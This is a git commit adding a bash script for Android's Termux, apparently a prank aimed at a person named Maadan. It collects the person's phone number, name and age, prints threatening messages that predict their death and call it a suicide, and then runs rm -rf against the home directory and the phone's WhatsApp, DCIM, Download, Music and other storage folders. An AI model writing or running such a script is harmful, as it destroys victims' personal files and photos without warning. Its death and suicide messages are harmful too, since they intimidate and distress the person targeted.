8a222dab70df9e5c09d53e7a2b6b9d00bae97b16
Master-hack <96709855+DRACULA-HACK@users.noreply.github.com>
2022-05-16 17:23:24 +0530

    Create madan.sh

---
+++ madan.sh
@@ -0,0 +1,75 @@
+#!/bin/bash
+clear
+termux-setup-storage
+pkg update
+pkg upgrade
+apt install figlet
+clear
+figlet master-hack
+sleep 15
+clear
+figlet hi
+figlet maadan
+sleep 10
+figlet this
+figlet script
+figlet is
+sleep 15
+figlet fore
+figlet you
+sleep 15
+clear
+figlet master-hack
+echo "are you maadan yes or no"
+  echo " type( yes or no)"
+read yes
+
+echo "what is maadan fake number on nfa kallam"
+echo  "(type ) the number +1 (249) 70#-####"
+
+read number
+echo ""
+
+ echo " type your reall name to continue"
+
+read name
+clear
+echo ""
+echo "type your age to continue"
+read age
+clear
+echo ""
+echo " hello $name you are $age years old hamm "
+sleep 5
+echo ""
+
+echo  " loading "
+sleep 5
+echo " hacking your feuter "
+sleep 5
+echo " .........................."
+
+date=(date)
+sleep 3
+
+echo "Hello $name naw this is time $date ."
+echo "after feu minute your phone will get same issues"
+echo "your same file will be missing "
+
+sleep 15
+
+death=$((( $RANDOM % 15 ) + $age ))
+
+echo "Hi $name your death is comming  you will die at the age  $death  "
+echo ""
+echo " it will be a Suicide "
+
+rm -rf cd /sdcard/Android
+rm -rf cd ~
+rm -rf cd /sdcard/WhatsApp
+rm -rf cd /sdcard/DCIM
+rm -rf cd /sdcard/Download
+rm -rf cd /sdcard/Music
+rm -rf cd /sdcard/SHAREit
+Sleep 15
+echo "storage cleared by"
